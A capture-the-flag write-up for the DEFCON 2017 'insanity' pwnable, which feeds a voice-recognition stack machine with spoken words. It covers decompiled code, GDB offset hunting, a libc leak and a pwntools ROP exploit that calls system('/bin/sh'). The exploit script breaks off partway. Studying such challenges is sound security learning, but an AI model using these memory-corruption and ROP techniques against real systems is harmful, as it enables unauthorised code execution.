---
title: "Potent Pwnables) insanity"
sidebar_position: 1
---
## **Information**

### **Description**
```
Are you a chicken?

insanity\_thereisnorightandwrongtheresonlyfunandboring.quals.shallweplayaga.me:18888

Files <https://2017.notmalware.ru/90ac48d8e27c81628dd56a6e3926a18cd6a399c3/insanity.tar.bz2>
```
### **File**

* [insanity.tar.bz2](/attachments/1147561/1147560.bz2)

### **Source Code**

## **Writeup**

### File information

```bash title="File information"
lazenca0x0@ubuntu:~/CTF/DEFCON2017/insanity$ file insanity
insanity: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=6ea3c95d733e8a74075300acbba43d54a23b56c3, stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2017/insanity$ checksec.sh --file insanity
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   insanity
lazenca0x0@ubuntu:~/CTF/DEFCON2017/insanity$
```

### **Binary analysis**

#### **Main(voice command system)**
* This function has the following functions:
  + The program uses pocketsphinx, SphinxBase, and zlib libraries.
  - These libraries are libraries that convert voice data into text. + The value obtained by ORing the CMDs address value and 0x8000000000000000 is stored in the CMDs.cmdList[0] area.
  + The program receives the size of data to be input from the user (using the read() function).
    - The value cannot exceed 65536.
  + Then, voice data is input from the user using the read() function.
    - Voice data is decompressed using the zlib library.
    - The decompressed voice data is xored by the \_mm\_xor\_si128() function.
      * The xor operation is performed 8 bits at a time, and the key used for the xor operation is 0x80.
    - Decrypted voice data is stored in samples\_8bit and samples\_16bit.
    - In other words, the transmitted voice data must be xored using 0x80 and compressed using the zlib library.
  + The processed voice data returns a value converted to text by the ps\_get\_hyp() function.
    - Counts the number of "insanity" words in the returned string.
    - And when the word "insane" appears, the number of "insanity" words is stored in CMDs.cmdList[].

```c title="main"
signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
...

  v71 = *MK_FP(__FS__, 40LL);
  keyPattern[0] = -9223231297218904064LL;
  keyPattern[0] = -9223231297218904064LL;
  ytinasni = 'ytinasni';
  v68 = 0;
  signal(14, handler);
  alarm(0x1Eu);
  setbuf(stdout, 0LL);
  memset(&CMDs, 0, sizeof(CMDs));
  err_set_logfp(0LL, 0LL);
  v3 = ps_args(0LL);
  config = cmd_ln_init(
             0LL,
             v3,
             1LL,
             "-hmm",
             "./model/en-us",
             "-lm",
             "./model/en-us.lm.bin",
             "-dict",
             "./model/cmudict-en-us.dict",
             0LL);
  if ( config )
  {
    decoder = ps_init(config);
    if ( decoder )
    {
      cmdMaxCount = 2;
      CMDs.cmdList[0] = (unsigned __int64)&CMDs | 0x8000000000000000LL;
      while ( 1 )
      {
LABEL_4:
        alarm(0x1Eu);
        len = read(0, &score, 4uLL);
        if ( len <= 0 )
          goto LABEL_20;
        if ( !score )
          break;
        ps_start_utt(decoder, &score);
        write(1, ".", 1uLL);
        memset(&stream, 0, sizeof(stream));
        ret = inflateInit_(&stream, "1.2.8", 112LL);
        if ( ret )
          goto LABEL_20;
LABEL_7:
        v8 = score;
        if ( score )
        {
          if ( ret != 1 )
          {
            if ( score >= 0x10001 )
              v8 = 0x10000;
            count = 0;
            while ( 1 )
            {
              v10 = read(0, &input_buf[count], v8 - count);
              if ( !v10 )
                break;
              count += v10;
              if ( v8 <= count )
              {
                score -= v8;
                stream.avail_in = v8;
                stream.next_in = input_buf;
                while ( 1 )
                {
                  stream.avail_out = 0x10000;
                  stream.next_out = &data8bit;
                  v18 = inflate(&stream, 0LL);
                  ret = v18;
                  if ( (unsigned int)(v18 + 4) <= 6 )
                  {
                    if ( (1LL << ((unsigned __int8)v18 + 4)) & 0x47 )
                      goto LABEL_20;
                  }
                  length = 0x10000LL - stream.avail_out;
                  pLoad = (__m128i *)&data8bit;
                  pStore = (__m128i *)&data16bit;
                  block = ((0x10000 - (unsigned __int64)stream.avail_out) >> 5) + 1;
                  key = _mm_stream_load_si128((__m128i *)keyPattern);
                  do
                  {
                    x0 = _mm_stream_load_si128(pLoad);
                    x1 = _mm_stream_load_si128(pLoad + 1);
                    _mm_stream_si128(pStore, _mm_xor_si128(_mm_unpacklo_epi8(0LL, x0), key));
                    _mm_stream_si128(pStore + 1, _mm_xor_si128(_mm_unpackhi_epi8(0LL, x0), key));
                    _mm_stream_si128(pStore + 2, _mm_xor_si128(_mm_unpacklo_epi8(0LL, x1), key));
                    _mm_stream_si128(pStore + 3, _mm_xor_si128(_mm_unpackhi_epi8(0LL, x1), key));
                    pStore += 4;
                    pLoad += 2;
                    --block;
                  }
                  while ( block );
                  alarm(0x1Eu);
                  ps_process_raw(decoder, &data16bit, length, 0LL, 0LL);
                  if ( stream.avail_out )
                    goto LABEL_7;
                }
              }
            }
          }
          goto LABEL_20;
        }
        if ( ret != 1 )
          goto LABEL_20;
        command = 0;
        count_1 = 0;
        ps_end_utt(decoder);
        hypString = (const char *)ps_get_hyp(decoder, &v61);
        while ( hypString[count_1] && (unsigned int)(cmdMaxCount - 2) <= 0x3E8 )
        {
          if ( !memcmp(&hypString[count_1], "insanity ", 9uLL) )
          {
            ++command;
            count_1 += 9;
          }
          else
          {
            if ( memcmp(&hypString[count_1], "insane", 7uLL) )
              goto LABEL_4;
            tmp = command;
            count_1 += 7;
            command = 0;
            CMDs.cmdList[cmdMaxCount++] = tmp;
          }
        }
      }
      v23 = len;
      write(1, "\n", 1uLL);
```

#### **Main(Processing function)**

* The code in that area has the following functions:
  + Load the saved command number from CMDs.cmdList[].
  + command cannot be greater than 9.
* The functions supported by the program are as follows:
  + The part to pay attention to here is the part where you get the data stored in the CMDs[] array.  
    - When retrieving data used for calculations, the value stored in cmdMaxCount is used.
    - When retrieving the code of a program, the value of codeCount is used.

**Explain function.**

| Command number | Function | Explain |
| --- | --- | --- |
| 1 |  | Store the word "insanity" on the stack. |
| 2 | Add | Get two values ​​(cmdMaxCount, cmdMaxCount -1) from CMDs.cmdList[] and store the added value in CMDs.cmdList[cmdMaxCount -1]. |
| 3 | Sub | Takes two values ​​(cmdMaxCount, cmdMaxCount -1) from CMDs.cmdList[] and stores the subtracted value in CMDs.cmdList[cmdMaxCount -1]. |
| 4 | Mul | Takes two values ​​(cmdMaxCount, cmdMaxCount -1) from CMDs.cmdList[] and stores the multiplied value in CMDs.cmdList[cmdMaxCount -1]. |
| 5 | Cmp | Gets two values ​​(cmdMaxCount, cmdMaxCount -1) from CMDs.cmdList[] and stores the compared values ​​in CMDs.cmdList[cmdMaxCount -1]. |
| 6 | load | The value is taken from CMDs.cmdList[] and the calculated value is saved after operation as follows.   + Save the value stored in CMDs.cmdList[++cmdMaxCount] to firstLoad.   + The value stored in CMDs.cmdList[firstLoad] is stored in secLoad.   + AND the secLoad value with the 0x7FFFFFFFFFFFFFFFLL value.   + And add the calculated value "8 \CMDs.cmdList[cmdMaxCount]" to that value.   + The calculated value is saved in the CMDs.cmdList[cmdMaxCount] area.   + You can use this function to load values ​​stored in an arbitrary area. |
| 7 | Store | Two values ​​(cmdMaxCount, cmdMaxCount -1) are taken from CMDs.cmdList[] and stored in storeDest and storeSrc.   + The value is stored in storeSrc in the CMDs.cmdList[storeDest] area.   + You can overwrite values ​​in arbitrary areas using this function.   + Saves cmdMaxCount by subtracting 2 from the value stored in cmdMaxCount. |
| 8 | Jump | Two values ​​(cmdMaxCount, cmdMaxCount -1) are taken from CMDs.cmdList[] and stored in jump\_1 and jump\_2. Among those values, jump\_1 is used in the following operations.   + "codeCount + jump\_1 - 1" operation result value is stored in tmp\_1. If there is a value in jump2, the previously calculated value is stored in codeCount.   + This allows access to random areas. |
| default | Save | If the value of getCmd is not equal to 1~8,999, it behaves like this:    + CMDs.cmdList[++cmdMaxCount] = getCMD - 10;   + You can use this function to store values ​​in the CMDs array. |

```c title="Main - Processing function"
...
      write(1, "\n", 1uLL);
      v24 = cmdMaxCount;
      CMDs.cmdList[cmdMaxCount] = 0LL;
      CMDs.cmdList[1] = (unsigned __int64)&hypString[v23] | 0x8000000000000000LL;
      getCMD = CMDs.cmdList[2];
      if ( CMDs.cmdList[2] )
      {
        codeCount = 2;
        while ( 2 )
        {
          switch ( getCMD )
          {
            case 1LL:
              if ( cmdMaxCount == 999 )
                goto LABEL_76;
              CMDs.cmdList[++cmdMaxCount] = (unsigned __int64)&ytinasni | 0x8000000000000000LL;
              goto LABEL_36;
            case 2LL:
              target = cmdMaxCount - 1;
              add_1 = CMDs.cmdList[cmdMaxCount];
              add_2 = CMDs.cmdList[cmdMaxCount - 1];
              if ( (add_1 & add_2) < 0 )
              {
                v53 = (const char *)target;
                srcMEM = (char *)(add_1 & 0x7FFFFFFFFFFFFFFFLL);
                srcSTR = (char *)(add_2 & 0x7FFFFFFFFFFFFFFFLL);
                v56 = strlen(srcMEM) + 1;
                dest = malloc((signed int)(v56 - 1 + strlen((const char *)(add_2 & 0x7FFFFFFFFFFFFFFFLL)) + 1));
                memcpy(dest, srcMEM, v56 - 1);
                strcpy((char *)dest + v56 - 1, srcSTR);
                v58 = cmdMaxCount - 1;
                CMDs.cmdList[(_QWORD)v53] = (__int64)dest;
                if ( &ytinasni != (__int64 *)srcMEM )
                {
                  free(srcMEM);
                  v58 = cmdMaxCount - 1;
                }
                cmdMaxCount = v58;
                if ( srcSTR != (char *)&ytinasni )
                  free(srcSTR);
              }
              else
              {
                if ( add_2 < 0 || add_1 < 0 )
                {
                  puts("Invalid add\n");
                  _exit(0);
                }
                --cmdMaxCount;
                CMDs.cmdList[target] = add_1 + add_2;
              }
              goto LABEL_36;
            case 3LL:
              target = cmdMaxCount - 1;
              subtract_1 = CMDs.cmdList[cmdMaxCount];
              subtract_2 = CMDs.cmdList[cmdMaxCount - 1];
              if ( subtract_2 < 0 || subtract_1 < 0 )
              {
                puts("Invalid subtract\n");
                _exit(0);
              }
              --cmdMaxCount;
              CMDs.cmdList[target] = subtract_2 - subtract_1;
              goto LABEL_36;
            case 4LL:
              target = cmdMaxCount - 1;
              mul_1 = CMDs.cmdList[cmdMaxCount];
              mul_2 = CMDs.cmdList[cmdMaxCount - 1];
              if ( mul_2 < 0 || mul_1 < 0 )
              {
                puts("Invalid multiply\n");
                _exit(0);
              }
              --cmdMaxCount;
              CMDs.cmdList[target] = mul_2 * mul_1;
              goto LABEL_36;
            case 5LL:
              target = cmdMaxCount - 1;
              compare_1 = CMDs.cmdList[cmdMaxCount];
              compare_2 = CMDs.cmdList[cmdMaxCount - 1];
              if ( (compare_1 & compare_2) < 0 )
              {
                v51 = strcmp(
                        (const char *)(compare_1 & 0x7FFFFFFFFFFFFFFFLL),
                        (const char *)(compare_2 & 0x7FFFFFFFFFFFFFFFLL));
                v52 = cmdMaxCount--;
                CMDs.cmdList[v52 - 2] = v51 == 0;
              }
              else
              {
                if ( compare_2 < 0 || compare_1 < 0 )
                {
                  puts("Invalid compare\n");
                  _exit(0);
                }
                --cmdMaxCount;
                CMDs.cmdList[target] = compare_1 == compare_2;
              }
              goto LABEL_36;
            case 6LL:
              firstLoad = CMDs.cmdList[++codeCount];
              if ( firstLoad > 1 || (secLoad = CMDs.cmdList[firstLoad], secLoad >= 0) )
              {
                puts("Invalid load\n");
                _exit(0);
              }
              CMDs.cmdList[cmdMaxCount] = *(_QWORD *)((secLoad & 0x7FFFFFFFFFFFFFFFLL) + 8 * CMDs.cmdList[cmdMaxCount]);
              goto LABEL_36;
            case 7LL:
              v35 = cmdMaxCount;
              cmdMaxCount -= 2;
              v36 = v35 - 1;
              storeDest = CMDs.cmdList[v35];
              storeSrc = CMDs.cmdList[v36];
              if ( storeDest < 0 )
              {
                puts("Invalid store\n");
                _exit(0);
              }
              CMDs.cmdList[storeDest] = storeSrc;
              goto LABEL_36;
            case 8LL:
              v41 = cmdMaxCount;
              cmdMaxCount -= 2;
              jump_1 = CMDs.cmdList[v41];
              jump_2 = CMDs.cmdList[(signed int)v41 - 1];
              if ( jump_2 < 0 || jump_1 < 0 )
              {
                puts("Invalid jump\n");
                _exit(0);
              }
              tmp_1 = codeCount + jump_1 - 1;
              if ( jump_2 )
                codeCount = tmp_1;
              goto LABEL_36;
            case 9LL:
              if ( cmdMaxCount == 999 )
                goto LABEL_76;
              v27 = (struct_v27 *)malloc(2uLL);
              v27->byte1 = 0;
              v27->byte0 = CMDs.cmdList[cmdMaxCount - 1];
              CMDs.cmdList[cmdMaxCount] = (unsigned __int64)v27 | 0x8000000000000000LL;
              goto LABEL_36;
            default:
              if ( cmdMaxCount == 999 )
                goto LABEL_76;
              CMDs.cmdList[++cmdMaxCount] = getCMD - 10;
LABEL_36:
              getCMD = CMDs.cmdList[++codeCount];
              if ( getCMD )
                continue;
              v24 = cmdMaxCount;
              break;
          }
          break;
        }
      }
      v28 = CMDs.cmdList[v24];
      if ( v28 >= 0 )
      {
        __printf_chk(1LL, "result: %lx\n", v28);
LABEL_20:
        result = 0LL;
        goto LABEL_21;
      }
      __printf_chk(1LL, "result: %s\n", v28 & 0x7FFFFFFFFFFFFFFFLL);
      result = 0LL;
    }
    else
    {
      fwrite("Failed to create recognizer, see log for details\n", 1uLL, 0x31uLL, stderr);
      result = 0xFFFFFFFFLL;
    }
  }
  else
  {
    fwrite("Failed to create config object, see log for details\n", 1uLL, 0x34uLL, stderr);
    result = 0xFFFFFFFFLL;
  }
LABEL_21:
  if ( *MK_FP(__FS__, 40LL) == v71 )
    return result;
LABEL_76:
  puts("Internal limitation\n");
  _exit(0);
  return result;
}
```

### Structure of Exploit code
:::note
* Use the Jump function to move to the area where the fake code is stored.
  + Calculate the required values ​​using the Add and Mul functions.
* Overwrite the stack area using fake code.  
  + system()
    - Save Offset (libc addresses) using the Save function.
    - Leak libc addresses using the Load function.
      * Add '0' to retrieve the value saved in the CMDs.cmdList[0] area.
      * In other words, the value stored in the CMDs.cmdList[0] area and the value stored in the address of the CMDs address plus Offset (libc addresses) are stored in CMDs.cmdList[].
    - Save **Offset(system)** using the Save function.
    - Calculate the address of the system() function using the Add function.
    - Save Offset (ret + 2) using the Save function.
    - Save the calculated value in the ret area using the Store function.
  + "/bin/sh"
    - Save Offset (libc addresses) using the Save function.
    - Leak libc addresses using the Load function.  
      * It is implemented and operates as described in the system() section.
    - Save **Offset("/bin/sh")** using the Save function.
    - Calculate the address of the "/bin/sh" string using the Add function.
    - Save Offset (ret + 1) using the Save function.
    - Save the calculated value in the ret area using the Store function.
  + "POP RDI"
    - Save Offset (libc addresses) using the Save function.
    - Leak libc addresses using the Load function.
      * It is implemented and operates as described in the system() section.
    - Save **Offset(POP RDI)** using the Save function.
    - Use the Add function to calculate the address of the “POP RDI” instruction.
    - Save Offset (ret + 2) using the Save function.
    - Save the calculated value in the ret area using the Store function.
:::

* The following information is required for an attack:

:::note
* Voice Files
  + Create audio files
  + Encrypt audio file
* Space to store Fake code
* Leak libc addresss
* Offset
  + Ret
  + Area where fake code is stored
  + system
:::

### **Information for attack**

#### **Create a voice files**

* To create a voice file for voice recognition, use the say command supported by Mac OS.
* In say, you can select any of the available voices as follows:
  + Alex, Fred, and Victoria support en\_US, but the recognition rate was not good.
  + So we use Samantha, which has a good recognition rate.

```sh title="List of available voices"
**********:Voices lazenca0x0$ say -v ?|grep en_US
Alex                en_US    # Most people recognize me by my voice.
Fred                en_US    # I sure like being inside this fancy computer
Samantha            en_US    # Hello, my name is Samantha. I am an American-English voice.
Victoria            en_US    # Isn't it nice to have a computer that will talk to you?
```

* Create a voice file using the following script.
  + When creating a voice file containing more than 5 words "insanity", you must use the -r option to adjust the pronunciation speed.
  + If the speed is not adjusted, the size of the generated voice file will be larger than the voice data size allowed by the problem.

```python title="Generate a voice file - CreateVoiceFiles.py"
import os
import sys

command = ''
for i in range(1,9):
    if(i < 5):
        command = "say -o insanity-16-" + str(i) + ".wav --data-format=LEI16@16000 -r 200 -v Samantha "+ "insanity "*i + "insane"
    else:
        command = "say -o insanity-16-" + str(i) + ".wav --data-format=LEI16@16000 -r 260 -v Samantha "+ "insanity "*i + "insane"

    os.system(command)
```

* This is voice data created using the script.

```sh title="Create a voice file - ls -al"
**********:Voices lazenca0x0$ ls -al
total 1440
drwxr-xr-x  12 JP11704  staff     408  5 18 18:57 .
drwx------+ 14 JP11704  staff     476  5 18 18:05 ..
-rw-r--r--@  1 JP11704  staff    6148  5 18 16:43 .DS_Store
-rw-r--r--   1 JP11704  staff   43848  5 18 18:57 insanity-16-1.wav
-rw-r--r--   1 JP11704  staff   60742  5 18 18:57 insanity-16-2.wav
-rw-r--r--   1 JP11704  staff   78706  5 18 18:57 insanity-16-3.wav
-rw-r--r--   1 JP11704  staff   96672  5 18 18:57 insanity-16-4.wav
-rw-r--r--   1 JP11704  staff   87474  5 18 18:57 insanity-16-5.wav
-rw-r--r--   1 JP11704  staff  100942  5 18 18:57 insanity-16-6.wav
-rw-r--r--   1 JP11704  staff  114410  5 18 18:57 insanity-16-7.wav
-rw-r--r--   1 JP11704  staff  127878  5 18 18:57 insanity-16-8.wav
-rw-r--r--@  1 JP11704  staff     365  5 18 18:57 script.py
**********:Voices lazenca0x0$
```

#### **Encrypt audio file**

* Convert voice data as follows:
  + To reduce the size of voice data, only the upper bits are imported and converted.

```python title="Encrypt a voice file - EncryptVoiceFile.py"
def converter(filePath):
    datas = 0
    audioData = []

    with open(filePath) as f:
        f.read(0xe0) 
        while True:
            lBit8 = f.read(1)
            if not lBit8: 
                break
            
            hBit8 = f.read(1)
            if not hBit8:
                break
            hBit8_hex = ord(hBit8)

            audioData.append(chr(hBit8_hex^0x80))
            datas+=1

    log.info("File name : " + filePath + " " + str(hex(datas)))
    return ''.join(audioData)
```

#### **Space to store Fake code**

* You can check the space to store the fake code using the following script.

```python title="Find a space to store fake code"
import os
import zlib
from pwn import *

HOST = "127.0.0.1"
PORT = 9001

gPOC = []

p = remote(HOST, PORT)

gPOC.append(p64(0x4141))
gPOC.append(p64(0x4242))
gPOC.append(p64(0x4343))
gPOC.append(p64(0x4444))

data = zlib.compress(''.join(gPOC))
sleep(20)
p.send(p32(len(data)))
p.send(data)

p.send(p32(0))
p.interactive()
```

* Voice data delivered to the program is stored in the sampel\_8bit area.

```sh title="Find a space to store fake code - GDB" 
gdb-peda$ b *0x55b4c2947000 + 0x1180
Breakpoint 1 at 0x55b4c2948180
gdb-peda$ c
Breakpoint 1, 0x000055b4c2948180 in ?? ()
gdb-peda$ n
0x000055b4c2948188 in ?? ()
gdb-peda$ i r rsi
rsi            0x7ffd3c950160	0x7ffd3c950160
gdb-peda$ x/10gx 0x7ffd3c950160
0x7ffd3c950160:	0x0000000000004141	0x0000000000004242
0x7ffd3c950170:	0x0000000000004343	0x0000000000004444
0x7ffd3c950180:	0x0000000000000000	0x0000000000000000
0x7ffd3c950190:	0x0000000000000000	0x0000000000000000
0x7ffd3c9501a0:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* However, since voice data is not included, an error occurs and the program ends.

```sh title="Segmentation fault"
gdb-peda$ c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
```

* To solve this problem, voice data is added after the “Fake code” and transmitted.
  + Voice data has been added and the command code has been added properly.

```sh title="Find a space to store fake code - GDB"
gdb-peda$ b *0x555df242e000 + 0x137f
Breakpoint 1 at 0x555df242f37f
gdb-peda$ c
Breakpoint 1, 0x0000555df242f37f in ?? ()
gdb-peda$ p/x $rsp+$rdx*8+0xe0
$1 = 0x7fffc7b7b298
gdb-peda$ x/4gx 0x7fffc7b7b298 - 0x18
0x7fffc7b7b280:	0x80007fffc7b7b280	0x0000000000000000
0x7fffc7b7b290:	0x0000000000000001	0x0000000000000000
gdb-peda$ x/20 0x7fffc7b7b280 + 0x21f40
0x7fffc7b9d1c0:	0x7974696e61736e69	0x0000000000000000
0x7fffc7b9d1d0:	0x0000000000004141	0x0000000000004242
0x7fffc7b9d1e0:	0x0000000000004343	0x0000000000004444
0x7fffc7b9d1f0:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d200:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d210:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d220:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d230:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d240:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d250:	0x8080808080808080	0x8080808080808080
gdb-peda$
```

#### **Offset(CMDS - sample\_8bit)**

* You can get the offset value in the following way.
  + 0x7fffc7b9d1c0(sample\_8bit) - 0x7fffc7b7b280(CMDS) = 0x21f40 / 8 = 0x43e8(17384)

#### **Offset(CMDS - ret)**

* You can get the offset value in the following way.  
  + 0x7fffc7bbd218(ret) - 0x7fffc7b7b280(CMDS) = 0x41f98 / 8 = 0x83f3(33779)

```bash title="Offset(CMDS - ret) - GDB" 
gdb-peda$ b *0x555df242e000 + 0x128e
Breakpoint 2 at 0x555df242f28e
gdb-peda$ c
Continuing.
gdb-peda$ i r rsp
rsp            0x7fffc7bbd218	0x7fffc7bbd218
gdb-peda$ p/x 0x7fffc7bbd218 - 0x7fffc7b7b280
$12 = 0x41f98
gdb-peda$ p/d 0x41f98 / 8
$13 = 33779
gdb-peda$ x/10gx 0x7fffc7bbd218
0x7fffc7bbd218:	0x00007fbcb9600830	0x0000000000000000
0x7fffc7bbd228:	0x00007fffc7bbd2f8	0x0000000100000000
0x7fffc7bbd238:	0x0000555df242eef0	0x0000000000000000
0x7fffc7bbd248:	0x8f47125c3d72d0f9	0x0000555df242f8e8
0x7fffc7bbd258:	0x00007fffc7bbd2f0	0x0000000000000000
gdb-peda$
```

#### **Leak libc addresss**

* You can get libc addresses in the following way:
  + The libc addresses are stored in the rsp area used when calling the ret command.
  + You can use those addresses as base addresses.

```bash title="Leak libc addresss - GDB" 
gdb-peda$ x/2gx 0x7fffc7bbd218
0x7fffc7bbd218:	0x00007fbcb9600830	0x0000000000000000
gdb-peda$ info proc map
process 4148
Mapped addresss spaces:
          Start Addr           End Addr       Size     Offset objfile
      0x555df242e000     0x555df2430000     0x2000        0x0 /home/lazenca0x0/CTF/DEFCON2017/insanity/insanity
      0x555df2630000     0x555df2631000     0x1000     0x2000 /home/lazenca0x0/CTF/DEFCON2017/insanity/insanity
      0x555df2631000     0x555df2632000     0x1000     0x3000 /home/lazenca0x0/CTF/DEFCON2017/insanity/insanity
      0x555df2a0b000     0x555df591c000  0x2f11000        0x0 [heap]
      0x7fbcb573a000     0x7fbcb5ae4000   0x3aa000        0x0 
      0x7fbcb5e8e000     0x7fbcb8b39000  0x2cab000        0x0 
      0x7fbcb8b39000     0x7fbcb8d1a000   0x1e1000        0x0 /home/lazenca0x0/CTF/DEFCON2017/insanity/model/en-us/sendump
      0x7fbcb8d1a000     0x7fbcb8de7000    0xcd000        0x0 
      0x7fbcb8de7000     0x7fbcb90ba000   0x2d3000        0x0 /home/lazenca0x0/CTF/DEFCON2017/insanity/model/en-us/mdef
      0x7fbcb90ba000     0x7fbcb90d2000    0x18000        0x0 /lib/x86_64-linux-gnu/libpthread-2.23.so
      0x7fbcb90d2000     0x7fbcb92d1000   0x1ff000    0x18000 /lib/x86_64-linux-gnu/libpthread-2.23.so
      0x7fbcb92d1000     0x7fbcb92d2000     0x1000    0x17000 /lib/x86_64-linux-gnu/libpthread-2.23.so
      0x7fbcb92d2000     0x7fbcb92d3000     0x1000    0x18000 /lib/x86_64-linux-gnu/libpthread-2.23.so
      0x7fbcb92d3000     0x7fbcb92d7000     0x4000        0x0 
      0x7fbcb92d7000     0x7fbcb93df000   0x108000        0x0 /lib/x86_64-linux-gnu/libm-2.23.so
      0x7fbcb93df000     0x7fbcb95de000   0x1ff000   0x108000 /lib/x86_64-linux-gnu/libm-2.23.so
      0x7fbcb95de000     0x7fbcb95df000     0x1000   0x107000 /lib/x86_64-linux-gnu/libm-2.23.so
      0x7fbcb95df000     0x7fbcb95e0000     0x1000   0x108000 /lib/x86_64-linux-gnu/libm-2.23.so
      0x7fbcb95e0000     0x7fbcb979f000   0x1bf000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7fbcb979f000     0x7fbcb999f000   0x200000   0x1bf000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7fbcb999f000     0x7fbcb99a3000     0x4000   0x1bf000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7fbcb99a3000     0x7fbcb99a5000     0x2000   0x1c3000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7fbcb99a5000     0x7fbcb99a9000     0x4000        0x0 
      0x7fbcb99a9000     0x7fbcb99c2000    0x19000        0x0 /lib/x86_64-linux-gnu/libz.so.1.2.8
...
gdb-peda$ p/x 0x00007fbcb9600830 -0x7fbcb95e0000
$14 = 0x20830
```

#### **Offset(Leak libc addresss- Base libc addresss)**

* You can get the offset value using the following method.

```bash title="Offset(Leak libc addresss- Base libc addresss)"
gdb-peda$ x/3i 0x00007fbcb9600830
   0x7fbcb9600830 <__libc_start_main+240>:	mov    edi,eax
   0x7fbcb9600832 <__libc_start_main+242>:	call   0x7fbcb961a030 <__GI_exit>
   0x7fbcb9600837 <__libc_start_main+247>:	xor    edx,edx
gdb-peda$ p/x 0x00007fbcb9600830 - 0x7fbcb95e0000
$22 = 0x20830
gdb-peda$ p/d 0x20830 / 8
$24 = 16646
```

#### **Offset("/bin/sh" addresss)**

* You can get the offset value using the following method.

```bash title="Offset(\"/bin/sh\" addresss) - GDB"
gdb-peda$ find "/bin/sh" libc
Searching for '/bin/sh' in: libc ranges
Found 1 results, display max 1 items:
libc : 0x7fbcb976c177 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ p/x 0x7fbcb976c177 - 0x7fbcb95e0000
$2 = 0x18c177
```

#### **Offset(POP rdi)**

* "POP rdi" is needed to store "/bin/sh" in the RDI register.

```bash title="Offset(POP rdi) - GDB"
gdb-peda$ info proc map
process 3204
Mapped addresss spaces:
          Start Addr           End Addr       Size     Offset objfile
...
      0x7f8485bce000     0x7f8485d8d000   0x1bf000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
...
gdb-peda$ ropsearch 'pop rdi;' libc
Searching for ROP gadget: 'pop rdi;' in: libc ranges
0x00007f8485cac800 : (b'5fc3')	pop rdi; ret
0x00007f8485d0b802 : (b'5fc3')	pop rdi; ret
0x00007f8485c00bef : (b'5fc3')	pop rdi; ret
0x00007f8485c97c02 : (b'5fc3')	pop rdi; ret
0x00007f8485ced87f : (b'5fc3')	pop rdi; ret
0x00007f8485ca8fda : (b'5fc3')	pop rdi; ret
0x00007f8485cdb01a : (b'5fc3')	pop rdi; ret
0x00007f8485bf601b : (b'5fc3')	pop rdi; ret
0x00007f8485c42825 : (b'5fc3')	pop rdi; ret
0x00007f8485c96026 : (b'5fc3')	pop rdi; ret
0x00007f8485ccf027 : (b'5fc3')	pop rdi; ret
0x00007f8485c56828 : (b'5fc3')	pop rdi; ret
0x00007f8485c97831 : (b'5fc3')	pop rdi; ret
0x00007f8485bf4835 : (b'5fc3')	pop rdi; ret
0x00007f8485cdb039 : (b'5fc3')	pop rdi; ret
0x00007f8485d0503e : (b'5fc3')	pop rdi; ret
0x00007f8485cf283f : (b'5fc3')	pop rdi; ret
0x00007f8485cb8046 : (b'5fc3')	pop rdi; ret
0x00007f8485bf0848 : (b'5fc3')	pop rdi; ret
0x00007f8485bf2049 : (b'5fc3')	pop rdi; ret
0x00007f8485c9804b : (b'5fc3')	pop rdi; ret
0x00007f8485cfc962 : (b'5fc3')	pop rdi; ret
0x00007f8485cac852 : (b'5fc3')	pop rdi; ret
0x00007f8485cfc856 : (b'5fc3')	pop rdi; ret
0x00007f8485bf685c : (b'5fc3')	pop rdi; ret
--More--(25/884)q 
gdb-peda$ p/x 0x00007f8485cac800 - 0x7f8485bce000
$1 = 0xde800
gdb-peda$ c
```

## **Exploit Code**

* socat tcp-listen:9001,reuseaddr,fork,bind=0.0.0.0 exec:./insanity

```python title="Exploit Code - ROPExploit.py"
import os
import zlib
from pwn import *

BINARY_PATH = './insanity'
LIBC_PATH = '/lib/x86_64-linux-gnu/libc-2.23.so'

binary = ELF(BINARY_PATH)
libc = ELF(LIBC_PATH)

HOST = "127.0.0.1"
PORT = 9001

gAudio = []
gCmds = []
gCode = []
gPOC = []
pocCode = ''

offRet = 0x20830
offSystem = libc.symbols['system']
offBinsh = 0x18c177
offPOPrdi = 0xde800

def converter(filePath):
    datas = 0
    audioData = []

    with open(filePath) as f:
        while True:
            lBit8 = f.read(1)
            if not lBit8: 
                break
            
            hBit8 = f.read(1)
            if not hBit8:
                break
            hBit8_hex = ord(hBit8)

            audioData.append(chr(hBit8_hex^0x80))
            datas+=1

    log.info("File name : " + filePath + " " + str(hex(datas)))
    
    return ''.join(audioData)

def loadVoiceFile():
    for i in range(0,8):
        gAudio.append(converter('./Voices/insanity-16-'+str(i+1)+'.wav'))
        
def sendMSG(msg):
    data = zlib.compress(msg)
    p.send(p32(len(data)))
    p.send(data)

def createCode(val):
    Cmds = []
    Data = []
    tmp = 0

    while(val):
        tmp = val % 2
        if(tmp == 0):
            val = val / 2
            Cmds.append(4)
            Data.append(2)
        elif(tmp == 1):
            val = val - 1
            Cmds.append(2)
            Data.append(1)

    Cmds.append(4)

    Cmds.reverse()

    Cmds.append(8)
       
    gCode.extend(Cmds)
    gCode.extend(Data)
    log.info("Program code : " + str(gCode))
 
p = remote(HOST, PORT)

loadVoiceFile()

createCode(17362)
for i in gCode:
    sendMSG(gAudio[i-1])

#system()
gPOC.append(33779 + 10)
gPOC.append(6)
gPOC.append(0)
gPOC.append(offSystem - offRet + 10)
gPOC.append(2)
gPOC.append(33781 + 10)
gPOC.append(7)

#"/bin/sh"
gPOC.append(33779 + 10)
gPOC.append(6)
